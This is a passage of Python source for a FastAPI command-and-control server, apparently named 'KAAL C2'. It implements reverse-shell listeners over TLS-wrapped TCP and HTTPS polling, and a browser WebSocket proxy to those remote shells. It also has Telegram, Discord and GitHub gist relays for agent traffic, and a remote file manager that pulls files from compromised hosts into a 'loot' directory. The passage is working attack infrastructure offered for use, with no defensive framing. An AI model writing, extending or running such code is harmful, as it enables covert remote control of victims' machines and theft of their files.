            "timestamp": datetime.now().isoformat()
        })
        return {"status": "queued", "task_id": task_id, "task": task}


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await terminal_state.register_client(websocket)
    # Send initial state
    await websocket.send_json({
        "type": "agent_list",
        "data": list(agents.values())
    })
    try:
        while True:
            data = await websocket.receive_text()
            # Handle incoming WebSocket messages if needed
    except Exception:
        terminal_state.remove_client(websocket)

# =====================================================================
# --- Reverse Shell Listener & WebSocket Proxy                      ---
# =====================================================================
import socket as _socket
import uuid as _uuid
from dataclasses import dataclass, field as _field

@dataclass
class RevShellSession:
    session_id: str
    agent_id: str
    transport: str          # "tcp" or "https"
    listen_ip: str
    listen_port: int
    # TCP-specific
    tcp_reader: Any = None
    tcp_writer: Any = None
    tcp_server: Any = None  # asyncio.Server (kept for compat)
    tcp_input_queue: Any = None  # queue.Queue – thread-safe input for TCP
    # Output queue shared between reader task/thread and WS sender
    output_queue: Any = None  # asyncio.Queue
    # HTTPS-specific (polling)
    https_input_queue: Any = None   # asyncio.Queue  (operator → agent)
    https_output_queue: Any = None  # asyncio.Queue  (agent → operator)

# Active sessions keyed by session_id
revshell_sessions: Dict[str, RevShellSession] = {}

def _tcp_listener_thread(session_id: str, port: int, ssl_ctx):
    """Thread-based TCP reverse-shell listener.
    Uses raw socket + ssl.wrap_socket to avoid asyncio TLS interop issues with OpenSSL.
    Bridges received data into the asyncio output_queue via run_coroutine_threadsafe.
    """
    import socket as _sock_mod
    import ssl as _ssl_mod

    sess = revshell_sessions.get(session_id)
    if not sess:
        return

    # Thread-safe queue so _ws_reader can push keystrokes to us
    sess.tcp_input_queue = _queue.Queue()

    srv = _sock_mod.socket(_sock_mod.AF_INET, _sock_mod.SOCK_STREAM)
    srv.setsockopt(_sock_mod.SOL_SOCKET, _sock_mod.SO_REUSEADDR, 1)
    try:
        srv.bind(('0.0.0.0', port))
    except OSError as e:
        log.error(f"[TCP-Thread] Cannot bind port {port}: {e}")
        return
    srv.listen(1)
    log.info(f"[TCP-Thread] Listening on 0.0.0.0:{port} for session {session_id}")

    try:
        conn, addr = srv.accept()
    except Exception as e:
        log.error(f"[TCP-Thread] accept() failed: {e}")
        srv.close()
        return
    log.info(f"[TCP-Thread] Agent connected from {addr}")
    srv.close()  # Only one agent allowed per session

    if ssl_ctx:
        try:
            conn = ssl_ctx.wrap_socket(conn, server_side=True)
        except Exception as e:
            log.error(f"[TCP-Thread] TLS wrap failed: {e}")
            conn.close()
            return
    conn.settimeout(5)

    def _reader():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                asyncio.run_coroutine_threadsafe(sess.output_queue.put(data), app_loop)
            except TimeoutError:
                continue
            except OSError:
                break
            except Exception as e:
                log.error(f"[TCP-Thread] recv error: {e}")
                break
        # Signal EOF to the WebSocket output task
        asyncio.run_coroutine_threadsafe(sess.output_queue.put(None), app_loop)

    def _writer():
        while True:
            data = sess.tcp_input_queue.get()
            if data is None:
                break
            try:
                conn.sendall(data)
            except Exception as e:
                log.error(f"[TCP-Thread] send error: {e}")
                break
        try:
            conn.close()
        except Exception:
            pass

    t_r = _threading.Thread(target=_reader, daemon=True)
    t_w = _threading.Thread(target=_writer, daemon=True)
    t_r.start()
    t_w.start()
    t_r.join()  # Wait until agent disconnects
    sess.tcp_input_queue.put(None)  # Stop writer
    log.info(f"[TCP-Thread] Session {session_id} closed")


class RevShellStartRequest(BaseModel):
    agent_id: str
    transport: str       # "tcp" or "https"
    listen_ip: str
    listen_port: int = 4444

class RevShellStopRequest(BaseModel):
    session_id: str

@app.get("/api/revshell/myip")
async def get_my_ip():
    """Return the server's outbound LAN IP so the GUI can auto-fill it."""
    try:
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = "127.0.0.1"
    return {"ip": ip}

@app.post("/api/revshell/start")
async def revshell_start(req: RevShellStartRequest):
    """Start a reverse shell listener and return a session_id."""
    session_id = _uuid.uuid4().hex[:12]
    sess = RevShellSession(
        session_id=session_id,
        agent_id=req.agent_id,
        transport=req.transport,
        listen_ip=req.listen_ip,
        listen_port=req.listen_port,
        output_queue=asyncio.Queue(),
        https_input_queue=asyncio.Queue(),
        https_output_queue=asyncio.Queue(),
    )
    revshell_sessions[session_id] = sess

    if req.transport == "tcp":

        # ── Auto-generate a self-signed TLS cert if needed ─────────────
        ssl_dir   = Path(__file__).parent / "ssl"
        ssl_dir.mkdir(exist_ok=True)
        cert_file = ssl_dir / "revshell.crt"
        key_file  = ssl_dir / "revshell.key"
        ssl_ctx_srv = None
        if not cert_file.exists() or not key_file.exists():
            log.info("[REVSHELL] Generating self-signed TLS cert for TCP shell...")
            try:
                import subprocess as _sp
                _sp.run([
                    "openssl", "req", "-x509", "-newkey", "rsa:2048",
                    "-keyout", str(key_file), "-out", str(cert_file),
                    "-days", "3650", "-nodes",
                    "-subj", "/CN=kaal-c2/O=KAAL/C=US"
                ], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL, check=True)
                log.info(f"[REVSHELL] TLS cert written to {ssl_dir}")
            except Exception as cert_err:
                log.warning(f"[REVSHELL] Could not generate TLS cert ({cert_err}) — falling back to plaintext TCP")

        if cert_file.exists() and key_file.exists():
            import ssl as _ssl
            ssl_ctx_srv = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
            ssl_ctx_srv.load_cert_chain(str(cert_file), str(key_file))
            log.info("[REVSHELL] TLS enabled for TCP listener")
        else:
            log.warning("[REVSHELL] Running TCP listener WITHOUT TLS (plaintext) — agent must match")

        # Launch thread-based listener (bypasses asyncio SSL interop issues)
        t = _threading.Thread(
            target=_tcp_listener_thread,
            args=(session_id, req.listen_port, ssl_ctx_srv),
            daemon=True,
        )
        t.start()
        log.info(f"[REVSHELL] Thread-based TCP {'TLS' if ssl_ctx_srv else 'plaintext'} listener started on 0.0.0.0:{req.listen_port} (session {session_id})")

    elif req.transport == "https":
        log.info(f"[REVSHELL] HTTPS polling session {session_id} ready")

    return {"status": "listening", "session_id": session_id, "transport": req.transport}

@app.post("/api/revshell/stop")
async def revshell_stop(req: RevShellStopRequest):
    """Stop a reverse shell session."""
    sess = revshell_sessions.pop(req.session_id, None)
    if not sess:
        raise HTTPException(status_code=404, detail="Session not found")
    # Signal the writer thread to stop (TCP)
    if sess.tcp_input_queue is not None:
        sess.tcp_input_queue.put(None)
    # Legacy asyncio server (kept for safety)
    if sess.tcp_server:
        try:
            sess.tcp_server.close()
        except Exception:
            pass
    return {"status": "stopped"}

@app.websocket("/ws/revshell/{session_id}")
async def revshell_ws(websocket: WebSocket, session_id: str):
    """Bidirectional WebSocket proxy: GUI xterm.js ↔ remote shell (TCP or HTTPS)."""
    await websocket.accept()
    sess = revshell_sessions.get(session_id)
    if not sess:
        await websocket.close(code=4004, reason="Session not found")
        return

    await websocket.send_text("\r\n\x1b[1;32m[+] Session open. Waiting for agent to connect back...\x1b[0m\r\n")

    # Buffer for keystrokes received before the agent connects back
    _pending_input: list = []

    async def _ws_reader():
        """Forward keystrokes from the browser → shell (TCP queue / HTTPS queue)."""
        try:
            while True:
                msg = await websocket.receive()
                data = msg.get("bytes") or (msg.get("text", "") or "").encode()
                if not data:
                    continue
                if sess.transport == "tcp":
                    if sess.tcp_input_queue is not None:
                        sess.tcp_input_queue.put(data)
                    else:
                        # Thread not started yet — buffer briefly
                        _pending_input.append(data)
                elif sess.transport == "https":
                    # No server-side echo – client handles local echo
                    data_out = data.replace(b'\r', b'\r\n')
                    await sess.https_input_queue.put(data_out)
        except Exception:
            pass

    async def _shell_output():
        """Forward shell output from the queue to the browser."""
        try:
            while True:
                chunk = await sess.output_queue.get()
                if chunk is None:
                    await websocket.send_text("\r\n\x1b[1;31m[!] Reverse shell disconnected.\x1b[0m\r\n")
                    break
                # Also flush any pending buffered keystrokes now that we have output
                if sess.tcp_writer and _pending_input:
                    for buf in _pending_input:
                        sess.tcp_writer.write(buf)
                    _pending_input.clear()
                    await sess.tcp_writer.drain()
                await websocket.send_bytes(chunk)
        except Exception:
            pass

    reader_task = asyncio.create_task(_ws_reader())
    output_task = asyncio.create_task(_shell_output())
    
    try:
        done, pending = await asyncio.wait(
            [reader_task, output_task],
            return_when=asyncio.FIRST_COMPLETED
        )
        for task in pending:
            task.cancel()
    except asyncio.CancelledError:
        reader_task.cancel()
        output_task.cancel()

# --- HTTPS polling endpoints (used by agent in HTTPS transport mode) ---

@app.get("/api/revshell/poll/{session_id}")
async def revshell_poll(session_id: str):
    """Agent polls this to receive operator keystrokes (HTTPS transport)."""
    sess = revshell_sessions.get(session_id)
    if not sess:
        raise HTTPException(status_code=404, detail="Session not found")
    try:
        data = await asyncio.wait_for(sess.https_input_queue.get(), timeout=10.0)
        return {"data": data.decode(errors="replace")}
    except asyncio.TimeoutError:
        return {"data": ""}

@app.post("/api/revshell/output/{session_id}")
async def revshell_output(session_id: str, request: Request):
    """Agent posts shell output here (HTTPS transport); proxied to WebSocket."""
    sess = revshell_sessions.get(session_id)
    if not sess:
        raise HTTPException(status_code=404, detail="Session not found")
    body = await request.body()
    await sess.output_queue.put(body)
    return {"status": "ok"}

# --- Relay Management Endpoints ---

class RelayAddRequest(BaseModel):
    relay_type: str  # "telegram", "discord", or "github"
    relay_id: str
    token: str
    chat_id: Optional[str] = None
    channel_id: Optional[str] = None
    gist_id: Optional[str] = None

@app.post("/api/relay/add")
async def add_relay(req: RelayAddRequest):
    """Add a new relay (Telegram/Discord)"""
    try:
        if req.relay_type == "telegram":
            if not req.chat_id:
                raise HTTPException(status_code=400, detail="chat_id required for Telegram")
            relay_manager.add_telegram_relay(req.relay_id, req.token, req.chat_id)
        elif req.relay_type == "discord":
            if not req.channel_id:
                raise HTTPException(status_code=400, detail="channel_id required for Discord")
            relay_manager.add_discord_relay(req.relay_id, req.token, req.channel_id)
        elif req.relay_type == "github":
            if not req.gist_id:
                raise HTTPException(status_code=400, detail="gist_id required for GitHub")
            relay_manager.add_github_relay(req.relay_id, req.token, req.gist_id)
        else:
            raise HTTPException(status_code=400, detail="Invalid relay_type")
        
        log.info(f"Added {req.relay_type} relay: {req.relay_id}")
        return {"status": "ok", "relay_id": req.relay_id}
    except Exception as e:
        log.error(f"Add relay error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/relay/list")
async def list_relays():
    """List all active relays"""
    return {"relays": relay_manager.get_relays()}

@app.delete("/api/relay/{relay_type}/{relay_id}")
async def remove_relay(relay_type: str, relay_id: str):
    """Remove a relay"""
    relay_manager.remove_relay(relay_type, relay_id)
    return {"status": "removed"}

@app.get("/api/relay/agents")
async def list_proxy_agents():
    """List all proxy agents and merge into main agents dict"""
    proxy_agents = relay_manager.get_agents()
    
    # Merge proxy agents into main agents dict
    for agent_data in proxy_agents:
        agent_id = agent_data["agent_id"]
        if agent_id not in agents:
            # Transform proxy agent data to match main agent format
            agents[agent_id] = {
                "id": agent_id,
                "platform": agent_data.get("platform", "unknown"),
                "hostname": agent_data.get("hostname", "unknown"),
                "internal_ip": "127.0.0.1", # Default for proxy
                "username": "unknown",
                "first_seen": datetime.fromtimestamp(agent_data["first_seen"]).isoformat(),
                "last_seen": datetime.fromtimestamp(agent_data["last_seen"]).isoformat(),
                "status": "active",
                "connection_type": "proxy",
                "relay_type": agent_data.get("relay_id", "unknown"),
                "tasks": []
            }
            
    return {"agents": list(proxy_agents)}

# --- File Manager Endpoints ---

@app.get("/api/files/{agent_id}")
async def get_agent_files(agent_id: str, path: str = ""):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    import uuid
    tid = str(uuid.uuid4())[:8]
    cmd_str = f"ls {path}" if path and path != "." else "ls"
    agents[agent_id]["tasks"].append({"task_id": tid, "command": cmd_str})
    return {"status": "queued", "task_id": tid}

@app.get("/api/files/{agent_id}/download")
async def request_agent_download(agent_id: str, path: str):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    import uuid
    tid = str(uuid.uuid4())[:8]
    agents[agent_id]["tasks"].append({"task_id": tid, "command": f"download {path}"})
    return {"status": "queued", "task_id": tid}

@app.post("/api/files/{agent_id}")
async def upload_agent_file(agent_id: str, destination: str = Form(...), file: UploadFile = File(...)):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    file_bytes = await file.read()
    total_size = len(file_bytes)
    file_name = file.filename
    dest_path = f"{destination}\\{file_name}" if "\\" in destination else f"{destination}/{file_name}"
    import uuid, base64, hashlib
    chunk_size = 8 * 1024 * 1024 
    total_chunks = max(1, (total_size + chunk_size - 1) // chunk_size)
    stream_id = f"up_{str(uuid.uuid4())[:8]}"
    for i in range(total_chunks):
        start = i * chunk_size
        end = min(start + chunk_size, total_size)
        chunk_bytes = file_bytes[start:end]
        chunk_hash = hashlib.sha256(chunk_bytes).hexdigest()
        b64_data = base64.b64encode(chunk_bytes).decode('utf-8')
        chunk_payload = {
            "stream_id": stream_id,
            "filename": dest_path,
            "chunk_index": i,
            "total_chunks": total_chunks,
            "hash": chunk_hash,
            "data": b64_data
        }
        agents[agent_id]["tasks"].append({
            "task_id": str(uuid.uuid4())[:8],
            "command": f'upload_chunk {json.dumps(chunk_payload)}'
        })
    return {"status": "queued", "stream_id": stream_id}

@app.delete("/api/files/{agent_id}")
async def delete_agent_file(agent_id: str, request: Request):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    data = await request.json()
    import uuid
    tid = str(uuid.uuid4())[:8]
    agents[agent_id]["tasks"].append({"task_id": tid, "command": f"delete_file {data.get('path')}"})
    return {"status": "queued"}

@app.post("/api/files/{agent_id}/mkdir")
async def mkdir_agent(agent_id: str, request: Request):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    data = await request.json()
    import uuid
    tid = str(uuid.uuid4())[:8]
    agents[agent_id]["tasks"].append({"task_id": tid, "command": f"make_dir {data.get('path')}"})
    return {"status": "queued"}

@app.post("/api/files/{agent_id}/mkfile")
async def mkfile_agent(agent_id: str, request: Request):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    data = await request.json()
    import uuid
    tid = str(uuid.uuid4())[:8]
    agents[agent_id]["tasks"].append({"task_id": tid, "command": f"make_file {data.get('path')}"})
    return {"status": "queued"}

@app.post("/api/files/{agent_id}/rename")
async def rename_agent_file(agent_id: str, request: Request):
    if agent_id not in agents: raise HTTPException(status_code=404, detail="Agent not found")
    data = await request.json()
    import uuid
    tid = str(uuid.uuid4())[:8]
    agents[agent_id]["tasks"].append({"task_id": tid, "command": f"rename_file {data.get('old_path')}?{data.get('new_path')}"})
    return {"status": "queued"}

# --- WebSocket Broadcasting Bridge ---

# Global event loop reference
app_loop = None

async def system_integrity_worker():
    """
    Background worker that periodically verifies system health.
    Provides the 'Checksum' verification requested by the Commander.
    """
    while True:
        try:
            # 1. DB Check
            database.conn.execute("SELECT 1").fetchone()
            db_status = "OK"
        except Exception as e:
            db_status = f"ERROR ({type(e).__name__})"
            log.error(f"Integrity Check: Database failure: {e}")

        # 2. Transport Health (Check if Discord relay hit /api/v1/relay/heartbeat recently)
        # For now, just count active heartbeats in last 10 mins
        
        # 3. Agent Counts
        active_count = sum(1 for a in agents.values() if a.get('status') == 'active')
        
        # 4. Generate Integrity Log
        log_msg = f"[INTEGRITY_CHECK] DB: {db_status} | Agents: {active_count} Active | Transports: Monitoring"
        log.info(log_msg)
        
        # Log to a special system 'agent' ID for unified tracking
        database.log_event("SYSTEM", "Integrity", log_msg)
        
        await asyncio.sleep(300) # Every 5 minutes


@app.post("/api/v1/relay/heartbeat")
async def relay_heartbeat(payload: dict):
    """Endpoint for C2 profiles (relays) to report their health."""
    relay_id = payload.get("relay_id", "unknown")
    await log_agent_event("SYSTEM", "Relay", f"Heartbeat received from Discord Relay: {relay_id}", "DEBUG")
    return {"status": "ok"}

async def check_agent_status():
    """Background task to check for dead agents."""
    while True:
        try:
            now = datetime.now()
            for agent_id, agent in list(agents.items()):
                last_seen_str = agent.get("last_seen")
                if not last_seen_str: continue
                
                try:
                    last_seen = datetime.fromisoformat(last_seen_str)
                    delta = (now - last_seen).total_seconds()
                    
                    if delta > 60 and agent.get("status") != "offline":
                        log.warning(f"Agent {agent_id} marked OFFLINE (last seen {int(delta)}s ago)")
                        agent["status"] = "offline"
                        database.mark_agent_offline(agent_id)
                        await terminal_state.broadcast("agent_updated", agent)
                        
                except ValueError:
                    continue # Bad timestamp format
                    
            await asyncio.sleep(10) # Check every 10 seconds
        except Exception as e:
            log.error(f"Status check error: {e}")
            await asyncio.sleep(10)

# --- Centralized Loot Directory ---
LOOT_DIR = Path("loot")
LOOT_DIR.mkdir(exist_ok=True)
DOWNLOADS_DIR = LOOT_DIR / "downloads"
DOWNLOADS_DIR.mkdir(exist_ok=True)

async def _broadcast_async(event: str, data: dict):
    """Actual async broadcast logic"""
    if event == "agent_connected":
        # Add proxy agent to main dict
        agent_id = data.get("agent_id")
        if agent_id:
            agents[agent_id] = {
                "id": agent_id,
                "platform": data.get("platform", "unknown"),
                "hostname": data.get("hostname", "unknown"),
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "status": "active",
                "connection_type": "proxy",
                "relay_type": data.get("relay", "unknown"),
                "tasks": []
            }
            await terminal_state.broadcast("agent_registered", agents[agent_id])
    elif event == "task_result":
        # Intercept download_chunk messages
        res_val = data.get("result", "")
        if isinstance(res_val, str) and res_val.startswith("[DOWNLOAD_CHUNK]"):
            import json, base64, hashlib
            try:
                payload = json.loads(data["result"][16:])
                agent_id = data.get("agent_id")
                filename = payload["filename"].split("\\")[-1].split("/")[-1]
                idx = payload["chunk_index"]
                total = payload["total_chunks"]
                chunk_hash = payload["hash"]
                b64_data = payload["data"]
                
                chunk_bytes = base64.b64decode(b64_data)
                calc_hash = hashlib.sha256(chunk_bytes).hexdigest()
                
                if calc_hash != chunk_hash:
                    log.error(f"Hash mismatch on chunk {idx} for {filename}")
                    data["result"] = f"Error: Hash mismatch on chunk {idx}"
                    await terminal_state.broadcast("task_result", data)
                    return
                
                agent_dir = DOWNLOADS_DIR / agent_id
                agent_dir.mkdir(exist_ok=True)
                file_path = agent_dir / filename
                
                mode = 'wb' if idx == 0 else 'ab'
                with open(file_path, mode) as f:
                    f.write(chunk_bytes)
                    
                data["result"] = f"[+] Chunk {idx+1}/{total} verified and saved to loot"
                if idx == total - 1:
                    data["result"] = f"[DOWNLOAD] {filename} (Saved to C2 Server Loot)"
            except Exception as e:
                log.error(f"Download chunk error: {e}")
                data["result"] = f"Error processing chunk: {e}"
        
        # Broadcast result to GUI
        await terminal_state.broadcast("task_result", data)
    elif event == "task_status":
        # Broadcast status update (ack, processing)
        await terminal_state.broadcast("task_status", data)

def relay_to_websocket_callback(event: str, data: dict):
    """Callback from RelayManager (runs in thread), schedules async broadcast"""
    if app_loop:
        asyncio.run_coroutine_threadsafe(_broadcast_async(event, data), app_loop)

# Register callback
relay_manager.register_callback(relay_to_websocket_callback)

# Serve Frontend
static_dir = Path(__file__).parent / "static"
if static_dir.exists():
    app.mount("/assets", StaticFiles(directory=static_dir), name="assets")
    app.mount("/static", StaticFiles(directory=static_dir), name="static_alias") # Ensure /static works too

# Mount Logos Directory
logos_path = Path("logos").resolve()
if not logos_path.exists():
    # Try relative to this file
    logos_path = (Path(__file__).parent.parent / "logos").resolve()

if logos_path.exists():
    print(f" [+] Mounting /logos from {logos_path}")
    app.mount("/logos", StaticFiles(directory=logos_path), name="logos")
else:
    print(f" [!] Warning: 'logos' directory not found at {logos_path}")

from fastapi.responses import FileResponse, HTMLResponse

@app.get("/{full_path:path}")
async def serve_static_app(full_path: str):
    # API requests are already handled by specific routes above due to order
    if full_path.startswith("api"):
        raise HTTPException(status_code=404, detail="API endpoint not found")
        
    index = static_dir / "index.html"
    if index.exists():
        return FileResponse(index)
    return HTMLResponse("<h1>KAAL Web Console</h1><p>NEBULA Console not found in web/static/index.html.</p>")

if __name__ == "__main__":
    import uvicorn
    print("\n" + "="*50)
    print(" KAAL C2 SERVER STARTING...")
    print("="*50)
    print(f" [+] Web Interface: http://localhost:5000")
    print(f" [+] API Endpoint:  http://localhost:5000/api")
    print("="*50 + "\n")
    uvicorn.run("web.server:app", host="0.0.0.0", port=5000, reload=True)

